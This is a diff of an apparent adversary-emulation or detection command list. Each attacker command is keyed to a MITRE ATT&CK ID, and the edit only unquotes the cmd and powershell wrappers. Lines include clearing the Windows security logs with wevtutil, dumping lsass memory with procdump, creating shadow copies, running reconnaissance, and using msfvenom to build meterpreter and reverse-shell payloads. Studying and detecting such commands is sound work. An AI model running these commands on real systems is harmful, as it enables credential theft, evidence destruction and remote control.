+T1070 powershell -c wevtutil clear-log security
 T1070 wevtutil.exe clear-log system
-T1070 cmd /c "wevtutil.exe clear-log system"
-T1070 powershell -c "wevtutil.exe clear-log system"
+T1070 cmd /c wevtutil.exe clear-log system
+T1070 powershell -c wevtutil.exe clear-log system
 T1070 wevtutil.exe clear-log application
-T1070 cmd /c "wevtutil.exe clear-log application"
-T1070 powershell -c "wevtutil.exe clear-log application"
+T1070 cmd /c wevtutil.exe clear-log application
+T1070 powershell -c wevtutil.exe clear-log application
 T1070 wevtutil.exe clear-log security
-T1070 cmd /c "wevtutil.exe clear-log security"
-T1070 powershell -c "wevtutil.exe clear-log security"
+T1070 cmd /c wevtutil.exe clear-log security
+T1070 powershell -c wevtutil.exe clear-log security
 
 # T1480.001 Execution Guardrails: Environmental Keying
 
 # T1003 OS Credential Dumping
 T1003 procdump -ma lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump -ma lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump -ma lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -ma lsass.exe lsassdump.dmp
 T1003 procdump.exe -ma lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump.exe -ma lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump.exe -ma lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump.exe -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -ma lsass.exe lsassdump.dmp
 T1003 procdump -accepteula -ma lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump -accepteula -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -accepteula -ma lsass.exe lsassdump.dmp
 T1003 procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
 T1003 procdump -mm lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump -mm lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump -mm lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -mm lsass.exe lsassdump.dmp
 T1003 procdump -accepteula -mm lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump -accepteula -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -accepteula -mm lsass.exe lsassdump.dmp
 T1003 procdump.exe -mm lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump.exe -mm lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump.exe -mm lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump.exe -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -mm lsass.exe lsassdump.dmp
 T1003 procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
-T1003 cmd /c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
-T1003 powershell -c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
+T1003 cmd /c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
 T1003 procdump -ma lsass lsassdump.dmp
-T1003 cmd /c "procdump -ma lsass lsassdump.dmp"
-T1003 powershell -c "procdump -ma lsass lsassdump.dmp"
+T1003 cmd /c procdump -ma lsass lsassdump.dmp
+T1003 powershell -c procdump -ma lsass lsassdump.dmp
 T1003 procdump.exe -ma lsass lsassdump.dmp
-T1003 cmd /c "procdump.exe -ma lsass lsassdump.dmp"
-T1003 powershell -c "procdump.exe -ma lsass lsassdump.dmp"
+T1003 cmd /c procdump.exe -ma lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -ma lsass lsassdump.dmp
 T1003 procdump -accepteula -ma lsass lsassdump.dmp
-T1003 cmd /c "procdump -accepteula -ma lsass lsassdump.dmp"
-T1003 powershell -c "procdump -accepteula -ma lsass lsassdump.dmp"
+T1003 cmd /c procdump -accepteula -ma lsass lsassdump.dmp
+T1003 powershell -c procdump -accepteula -ma lsass lsassdump.dmp
 T1003 procdump.exe -accepteula -ma lsass lsassdump.dmp
-T1003 cmd /c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
-T1003 powershell -c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
+T1003 cmd /c procdump.exe -accepteula -ma lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -ma lsass lsassdump.dmp
 T1003 procdump -mm lsass lsassdump.dmp
-T1003 cmd /c "procdump -mm lsass lsassdump.dmp"
-T1003 powershell -c "procdump -mm lsass lsassdump.dmp"
+T1003 cmd /c procdump -mm lsass lsassdump.dmp
+T1003 powershell -c procdump -mm lsass lsassdump.dmp
 T1003 procdump -accepteula -mm lsass lsassdump.dmp
-T1003 cmd /c "procdump -accepteula -mm lsass lsassdump.dmp"
-T1003 powershell -c "procdump -accepteula -mm lsass lsassdump.dmp"
+T1003 cmd /c procdump -accepteula -mm lsass lsassdump.dmp
+T1003 powershell -c procdump -accepteula -mm lsass lsassdump.dmp
 T1003 procdump.exe -mm lsass lsassdump.dmp
-T1003 cmd /c "procdump.exe -mm lsass lsassdump.dmp"
-T1003 powershell -c "procdump.exe -mm lsass lsassdump.dmp"
+T1003 cmd /c procdump.exe -mm lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -mm lsass lsassdump.dmp
 T1003 procdump.exe -accepteula -mm lsass lsassdump.dmp
-T1003 cmd /c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
-T1003 powershell -c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
+T1003 cmd /c procdump.exe -accepteula -mm lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -mm lsass lsassdump.dmp
 T1003 vssadmin create shadow /for=C:
-T1003 cmd /c "vssadmin create shadow /for=C:"
-T1003 powershell -c "vssadmin create shadow /for=C:"
+T1003 cmd /c vssadmin create shadow /for=C:
+T1003 powershell -c vssadmin create shadow /for=C:
 T1003 vssadmin.exe create shadow /for=C:
-T1003 cmd /c "vssadmin.exe create shadow /for=C:"
-T1003 powershell -c "vssadmin.exe create shadow /for=C:"
+T1003 cmd /c vssadmin.exe create shadow /for=C:
+T1003 powershell -c vssadmin.exe create shadow /for=C:
 T1003 wmic shadowcopy call create Volume=C:
-T1003 cmd /c "wmic shadowcopy call create Volume=C:"
-T1003 powershell -c "wmic shadowcopy call create Volume=C:"
+T1003 cmd /c wmic shadowcopy call create Volume=C:
+T1003 powershell -c wmic shadowcopy call create Volume=C:
 T1003 wmic.exe shadowcopy call create Volume=C:
-T1003 cmd /c "wmic.exe shadowcopy call create Volume=C:"
-T1003 powershell -c "wmic.exe shadowcopy call create Volume=C:"
+T1003 cmd /c wmic.exe shadowcopy call create Volume=C:
+T1003 powershell -c wmic.exe shadowcopy call create Volume=C:
 T1003 wmic /node:${ip_address} shadowcopy call create Volume=C:
-T1003 cmd /c "wmic /node:${ip_address} shadowcopy call create Volume=C:"
-T1003 powershell -c "wmic /node:${ip_address} shadowcopy call create Volume=C:"
+T1003 cmd /c wmic /node:${ip_address} shadowcopy call create Volume=C:
+T1003 powershell -c wmic /node:${ip_address} shadowcopy call create Volume=C:
 T1003 wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
-T1003 cmd /c "wmic.exe /node:${ip_address} shadowcopy call create Volume=C:"
-T1003 powershell -c "wmic.exe /node:${ip_address} shadowcopy call create Volume=C:"
+T1003 cmd /c wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+T1003 powershell -c wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
 
 # T1046 Network Service Discovery
 T1046 nmap ${ip_address}
@@ -682,742 +682,742 @@ T1046 nmap -p- -sC -O -A ${ip_address} 2> error.log
 
 # T1082 System Information Discovery
 T1082 systeminfo
-T1082 cmd /c "systeminfo"
-T1082 powershell -c "systeminfo"
+T1082 cmd /c systeminfo
+T1082 powershell -c systeminfo
 T1082 systeminfo.exe
-T1082 cmd /c "systeminfo.exe"
-T1082 powershell -c "systeminfo.exe"
+T1082 cmd /c systeminfo.exe
+T1082 powershell -c systeminfo.exe
 T1082 hostname
-T1082 cmd /c "hostname"
-T1082 powershell -c "hostname"
+T1082 cmd /c hostname
+T1082 powershell -c hostname
 T1082 hostname.exe
-T1082 cmd /c "hostname.exe"
-T1082 powershell -c "hostname.exe"
+T1082 cmd /c hostname.exe
+T1082 powershell -c hostname.exe
 T1082 tasklist
-T1082 cmd /c "tasklist"
-T1082 powershell -c "tasklist"
+T1082 cmd /c tasklist
+T1082 powershell -c tasklist
 T1082 tasklist.exe
-T1082 cmd /c "tasklist.exe"
-T1082 powershell -c "tasklist.exe"
+T1082 cmd /c tasklist.exe
+T1082 powershell -c tasklist.exe
 T1082 wmic os get Caption
-T1082 cmd /c "wmic os get Caption"
-T1082 powershell -c "wmic os get Caption"
+T1082 cmd /c wmic os get Caption
+T1082 powershell -c wmic os get Caption
 T1082 wmic.exe os get Caption
-T1082 cmd /c "wmic.exe os get Caption"
-T1082 powershell -c "wmic.exe os get Caption"
+T1082 cmd /c wmic.exe os get Caption
+T1082 powershell -c wmic.exe os get Caption
 T1082 wmic os get Version
-T1082 cmd /c "wmic os get Version"
-T1082 powershell -c "wmic os get Version"
+T1082 cmd /c wmic os get Version
+T1082 powershell -c wmic os get Version
 T1082 wmic.exe os get Version
-T1082 cmd /c "wmic.exe os get Version"
-T1082 powershell -c "wmic.exe os get Version"
+T1082 cmd /c wmic.exe os get Version
+T1082 powershell -c wmic.exe os get Version
 T1082 wmic os get Caption,Version
-T1082 cmd /c "wmic os get Caption,Version"
-T1082 powershell -c "wmic os get Caption,Version"
+T1082 cmd /c wmic os get Caption,Version
+T1082 powershell -c wmic os get Caption,Version
 T1082 wmic.exe os get Caption,Version
-T1082 cmd /c "wmic.exe os get Caption,Version"
-T1082 powershell -c "wmic.exe os get Caption,Version"
+T1082 cmd /c wmic.exe os get Caption,Version
+T1082 powershell -c wmic.exe os get Caption,Version
 T1082 wmic os get Name
-T1082 cmd /c "wmic os get Name"
-T1082 powershell -c "wmic os get Name"
+T1082 cmd /c wmic os get Name
+T1082 powershell -c wmic os get Name
 T1082 wmic.exe os get Name
-T1082 cmd /c "wmic.exe os get Name"
-T1082 powershell -c "wmic.exe os get Name"
+T1082 cmd /c wmic.exe os get Name
+T1082 powershell -c wmic.exe os get Name
 T1082 wmic os get TotalVirtualMemorySize
-T1082 cmd /c "wmic os get TotalVirtualMemorySize"
-T1082 powershell -c "wmic os get TotalVirtualMemorySize"
+T1082 cmd /c wmic os get TotalVirtualMemorySize
+T1082 powershell -c wmic os get TotalVirtualMemorySize
 T1082 wmic.exe os get TotalVirtualMemorySize
-T1082 cmd /c "wmic.exe os get TotalVirtualMemorySize"
-T1082 powershell -c "wmic.exe os get TotalVirtualMemorySize"
+T1082 cmd /c wmic.exe os get TotalVirtualMemorySize
+T1082 powershell -c wmic.exe os get TotalVirtualMemorySize
 T1082 wmic os get CSName
-T1082 cmd /c "wmic os get CSName"
-T1082 powershell -c "wmic os get CSName"
+T1082 cmd /c wmic os get CSName
+T1082 powershell -c wmic os get CSName
 T1082 wmic.exe os get CSName
-T1082 cmd /c "wmic.exe os get CSName"
-T1082 powershell -c "wmic.exe os get CSName"
+T1082 cmd /c wmic.exe os get CSName
+T1082 powershell -c wmic.exe os get CSName
 T1082 wmic os get FreePhysicalMemory
-T1082 cmd /c "wmic os get FreePhysicalMemory"
-T1082 powershell -c "wmic os get FreePhysicalMemory"
+T1082 cmd /c wmic os get FreePhysicalMemory
+T1082 powershell -c wmic os get FreePhysicalMemory
 T1082 wmic.exe os get FreePhysicalMemory
-T1082 cmd /c "wmic.exe os get FreePhysicalMemory"
-T1082 powershell -c "wmic.exe os get FreePhysicalMemory"
+T1082 cmd /c wmic.exe os get FreePhysicalMemory
+T1082 powershell -c wmic.exe os get FreePhysicalMemory
 T1082 wmic os get SystemDevice
-T1082 cmd /c "wmic os get SystemDevice"
-T1082 powershell -c "wmic os get SystemDevice"
+T1082 cmd /c wmic os get SystemDevice
+T1082 powershell -c wmic os get SystemDevice
 T1082 wmic.exe os get SystemDevice
-T1082 cmd /c "wmic.exe os get SystemDevice"
-T1082 powershell -c "wmic.exe os get SystemDevice"
+T1082 cmd /c wmic.exe os get SystemDevice
+T1082 powershell -c wmic.exe os get SystemDevice
 T1082 wmic os get OSArchitecture
-T1082 cmd /c "wmic os get OSArchitecture"
-T1082 powershell -c "wmic os get OSArchitecture"
+T1082 cmd /c wmic os get OSArchitecture
+T1082 powershell -c wmic os get OSArchitecture
 T1082 wmic.exe os get OSArchitecture
-T1082 cmd /c "wmic.exe os get OSArchitecture"
-T1082 powershell -c "wmic.exe os get OSArchitecture"
+T1082 cmd /c wmic.exe os get OSArchitecture
+T1082 powershell -c wmic.exe os get OSArchitecture
 
 # T1614 System Location Discovery
 T1614 arp -a
-T1614 cmd /c "arp -a"
-T1614 powershell -c "arp -a"
+T1614 cmd /c arp -a
+T1614 powershell -c arp -a
 T1614 arp.exe -a
-T1614 cmd /c "arp.exe -a"
-T1614 powershell -c "arp.exe -a"
+T1614 cmd /c arp.exe -a
+T1614 powershell -c arp.exe -a
 T1614 arp -g
-T1614 cmd /c "arp -g"
-T1614 powershell -c "arp -g"
+T1614 cmd /c arp -g
+T1614 powershell -c arp -g
 T1614 arp.exe -g
-T1614 cmd /c "arp.exe -g"
-T1614 powershell -c "arp.exe -g"
+T1614 cmd /c arp.exe -g
+T1614 powershell -c arp.exe -g
 T1614 ipconfig
-T1614 cmd /c "ipconfig"
-T1614 powershell -c "ipconfig"
+T1614 cmd /c ipconfig
+T1614 powershell -c ipconfig
 T1614 ipconfig.exe
-T1614 cmd /c "ipconfig.exe"
-T1614 powershell -c "ipconfig.exe"
+T1614 cmd /c ipconfig.exe
+T1614 powershell -c ipconfig.exe
 T1614 netstat
-T1614 cmd /c "netstat"
-T1614 powershell -c "netstat"
+T1614 cmd /c netstat
+T1614 powershell -c netstat
 T1614 netstat.exe
-T1614 cmd /c "netstat.exe"
-T1614 powershell -c "netstat.exe"
+T1614 cmd /c netstat.exe
+T1614 powershell -c netstat.exe
 T1614 netstat -a
-T1614 cmd /c "netstat -a"
-T1614 powershell -c "netstat -a"
+T1614 cmd /c netstat -a
+T1614 powershell -c netstat -a
 T1614 netstat.exe -a
-T1614 cmd /c "netstat.exe -a"
-T1614 powershell -c "netstat.exe -a"
+T1614 cmd /c netstat.exe -a
+T1614 powershell -c netstat.exe -a
 T1614 netstat -q
-T1614 cmd /c "netstat -q"
-T1614 powershell -c "netstat -q"
+T1614 cmd /c netstat -q
+T1614 powershell -c netstat -q
 T1614 netstat.exe -q
-T1614 cmd /c "netstat.exe -q"
-T1614 powershell -c "netstat.exe -q"
+T1614 cmd /c netstat.exe -q
+T1614 powershell -c netstat.exe -q
 T1614 netstat -r
-T1614 cmd /c "netstat -r"
-T1614 powershell -c "netstat -r"
+T1614 cmd /c netstat -r
+T1614 powershell -c netstat -r
 T1614 netstat.exe -r
-T1614 cmd /c "netstat.exe -r"
-T1614 powershell -c "netstat.exe -r"
+T1614 cmd /c netstat.exe -r
+T1614 powershell -c netstat.exe -r
 T1614 netstat -f
-T1614 cmd /c "netstat -f"
-T1614 powershell -c "netstat -f"
+T1614 cmd /c netstat -f
+T1614 powershell -c netstat -f
 T1614 netstat.exe -f
-T1614 cmd /c "netstat.exe -f"
-T1614 powershell -c "netstat.exe -f"
+T1614 cmd /c netstat.exe -f
+T1614 powershell -c netstat.exe -f
 T1614 ipconfig /all
-T1614 cmd /c "ipconfig /all"
-T1614 powershell -c "ipconfig /all"
+T1614 cmd /c ipconfig /all
+T1614 powershell -c ipconfig /all
 T1614 ipconfig.exe /all
-T1614 cmd /c "ipconfig.exe /all"
-T1614 powershell -c "ipconfig.exe /all"
+T1614 cmd /c ipconfig.exe /all
+T1614 powershell -c ipconfig.exe /all
 T1614 ipconfig /renew
-T1614 cmd /c "ipconfig /renew"
-T1614 powershell -c "ipconfig /renew"
+T1614 cmd /c ipconfig /renew
+T1614 powershell -c ipconfig /renew
 T1614 ipconfig.exe /renew
-T1614 cmd /c "ipconfig.exe /renew"
-T1614 powershell -c "ipconfig.exe /renew"
+T1614 cmd /c ipconfig.exe /renew
+T1614 powershell -c ipconfig.exe /renew
 T1614 ipconfig /allcompartments
-T1614 cmd /c "ipconfig /allcompartments"
-T1614 powershell -c "ipconfig /allcompartments"
+T1614 cmd /c ipconfig /allcompartments
+T1614 powershell -c ipconfig /allcompartments
 T1614 ipconfig.exe /allcompartments
-T1614 cmd /c "ipconfig.exe /allcompartments"
-T1614 powershell -c "ipconfig.exe /allcompartments"
+T1614 cmd /c ipconfig.exe /allcompartments
+T1614 powershell -c ipconfig.exe /allcompartments
 T1614 ipconfig /allcompartments /all
-T1614 cmd /c "ipconfig /allcompartments /all"
-T1614 powershell -c "ipconfig /allcompartments /all"
+T1614 cmd /c ipconfig /allcompartments /all
+T1614 powershell -c ipconfig /allcompartments /all
 T1614 ipconfig.exe /allcompartments /all
-T1614 cmd /c "ipconfig.exe /allcompartments /all"
-T1614 powershell -c "ipconfig.exe /allcompartments /all"
+T1614 cmd /c ipconfig.exe /allcompartments /all
+T1614 powershell -c ipconfig.exe /allcompartments /all
 
 # T1021 Remote Services
 T1021 mstsc /v:${ip_address}
-T1021 cmd /c "mstsc /v:${ip_address}"
-T1021 powershell -c "mstsc /v:${ip_address}"
+T1021 cmd /c mstsc /v:${ip_address}
+T1021 powershell -c mstsc /v:${ip_address}
 T1021 mstsc.exe /v:${ip_address}
-T1021 cmd /c "mstsc.exe /v:${ip_address}"
-T1021 powershell -c "mstsc.exe /v:${ip_address}"
+T1021 cmd /c mstsc.exe /v:${ip_address}
+T1021 powershell -c mstsc.exe /v:${ip_address}
 T1021 mstsc /v:${ip_address} /f
-T1021 cmd /c "mstsc /v:${ip_address} /f"
-T1021 powershell -c "mstsc /v:${ip_address} /f"
+T1021 cmd /c mstsc /v:${ip_address} /f
+T1021 powershell -c mstsc /v:${ip_address} /f
 T1021 mstsc.exe /v:${ip_address} /f
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f
+T1021 powershell -c mstsc.exe /v:${ip_address} /f
 T1021 mstsc /v:${ip_address} /public
-T1021 cmd /c "mstsc /v:${ip_address} /public"
-T1021 powershell -c "mstsc /v:${ip_address} /public"
+T1021 cmd /c mstsc /v:${ip_address} /public
+T1021 powershell -c mstsc /v:${ip_address} /public
 T1021 mstsc.exe /v:${ip_address} /public
-T1021 cmd /c "mstsc.exe /v:${ip_address} /public"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /public"
+T1021 cmd /c mstsc.exe /v:${ip_address} /public
+T1021 powershell -c mstsc.exe /v:${ip_address} /public
 T1021 mstsc /v:${ip_address} /f /public
-T1021 cmd /c "mstsc /v:${ip_address} /f /public"
-T1021 powershell -c "mstsc /v:${ip_address} /f /public"
+T1021 cmd /c mstsc /v:${ip_address} /f /public
+T1021 powershell -c mstsc /v:${ip_address} /f /public
 T1021 mstsc.exe /v:${ip_address} /f /public
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f /public"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f /public"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f /public
+T1021 powershell -c mstsc.exe /v:${ip_address} /f /public
 T1021 mstsc /v:${ip_address} /admin
-T1021 cmd /c "mstsc /v:${ip_address} /admin"
-T1021 powershell -c "mstsc /v:${ip_address} /admin"
+T1021 cmd /c mstsc /v:${ip_address} /admin
+T1021 powershell -c mstsc /v:${ip_address} /admin
 T1021 mstsc.exe /v:${ip_address} /admin
-T1021 cmd /c "mstsc.exe /v:${ip_address} /admin"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /admin"
+T1021 cmd /c mstsc.exe /v:${ip_address} /admin
+T1021 powershell -c mstsc.exe /v:${ip_address} /admin
 T1021 mstsc /v:${ip_address} /f /admin
-T1021 cmd /c "mstsc /v:${ip_address} /f /admin"
-T1021 powershell -c "mstsc /v:${ip_address} /f /admin"
+T1021 cmd /c mstsc /v:${ip_address} /f /admin
+T1021 powershell -c mstsc /v:${ip_address} /f /admin
 T1021 mstsc.exe /v:${ip_address} /f /admin
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f /admin"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f /admin"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f /admin
+T1021 powershell -c mstsc.exe /v:${ip_address} /f /admin
 T1021 mstsc /v:${ip_address} /restrictedAdmin
-T1021 cmd /c "mstsc /v:${ip_address} /restrictedAdmin"
-T1021 powershell -c "mstsc /v:${ip_address} /restrictedAdmin"
+T1021 cmd /c mstsc /v:${ip_address} /restrictedAdmin
+T1021 powershell -c mstsc /v:${ip_address} /restrictedAdmin
 T1021 mstsc.exe /v:${ip_address} /restrictedAdmin
-T1021 cmd /c "mstsc.exe /v:${ip_address} /restrictedAdmin"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /restrictedAdmin"
+T1021 cmd /c mstsc.exe /v:${ip_address} /restrictedAdmin
+T1021 powershell -c mstsc.exe /v:${ip_address} /restrictedAdmin
 T1021 mstsc /v:${ip_address} /f /restrictedAdmin
-T1021 cmd /c "mstsc /v:${ip_address} /f /restrictedAdmin"
-T1021 powershell -c "mstsc /v:${ip_address} /f /restrictedAdmin"
+T1021 cmd /c mstsc /v:${ip_address} /f /restrictedAdmin
+T1021 powershell -c mstsc /v:${ip_address} /f /restrictedAdmin
 T1021 mstsc.exe /v:${ip_address} /f /restrictedAdmin
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f /restrictedAdmin
+T1021 powershell -c mstsc.exe /v:${ip_address} /f /restrictedAdmin
 T1021 mstsc /v:${ip_address} /remoteGuard
-T1021 cmd /c "mstsc /v:${ip_address} /remoteGuard"
-T1021 powershell -c "mstsc /v:${ip_address} /remoteGuard"
+T1021 cmd /c mstsc /v:${ip_address} /remoteGuard
+T1021 powershell -c mstsc /v:${ip_address} /remoteGuard
 T1021 mstsc.exe /v:${ip_address} /remoteGuard
-T1021 cmd /c "mstsc.exe /v:${ip_address} /remoteGuard"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /remoteGuard"
+T1021 cmd /c mstsc.exe /v:${ip_address} /remoteGuard
+T1021 powershell -c mstsc.exe /v:${ip_address} /remoteGuard
 T1021 mstsc /v:${ip_address} /f /remoteGuard
-T1021 cmd /c "mstsc /v:${ip_address} /f /remoteGuard"
-T1021 powershell -c "mstsc /v:${ip_address} /f /remoteGuard"
+T1021 cmd /c mstsc /v:${ip_address} /f /remoteGuard
+T1021 powershell -c mstsc /v:${ip_address} /f /remoteGuard
 T1021 mstsc.exe /v:${ip_address} /f /remoteGuard
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f /remoteGuard"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f /remoteGuard"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f /remoteGuard
+T1021 powershell -c mstsc.exe /v:${ip_address} /f /remoteGuard
 T1021 mstsc /v:${ip_address} /multimon
-T1021 cmd /c "mstsc /v:${ip_address} /multimon"
-T1021 powershell -c "mstsc /v:${ip_address} /multimon"
+T1021 cmd /c mstsc /v:${ip_address} /multimon
+T1021 powershell -c mstsc /v:${ip_address} /multimon
 T1021 mstsc.exe /v:${ip_address} /multimon
-T1021 cmd /c "mstsc.exe /v:${ip_address} /multimon"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /multimon"
+T1021 cmd /c mstsc.exe /v:${ip_address} /multimon
+T1021 powershell -c mstsc.exe /v:${ip_address} /multimon
 T1021 mstsc /v:${ip_address} /f /multimon
-T1021 cmd /c "mstsc /v:${ip_address} /f /multimon"
-T1021 powershell -c "mstsc /v:${ip_address} /f /multimon"
+T1021 cmd /c mstsc /v:${ip_address} /f /multimon
+T1021 powershell -c mstsc /v:${ip_address} /f /multimon
 T1021 mstsc.exe /v:${ip_address} /f /multimon
-T1021 cmd /c "mstsc.exe /v:${ip_address} /f /multimon"
-T1021 powershell -c "mstsc.exe /v:${ip_address} /f /multimon"
+T1021 cmd /c mstsc.exe /v:${ip_address} /f /multimon
+T1021 powershell -c mstsc.exe /v:${ip_address} /f /multimon
 
 # T1071 Application Layer Protocol
 T1071 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
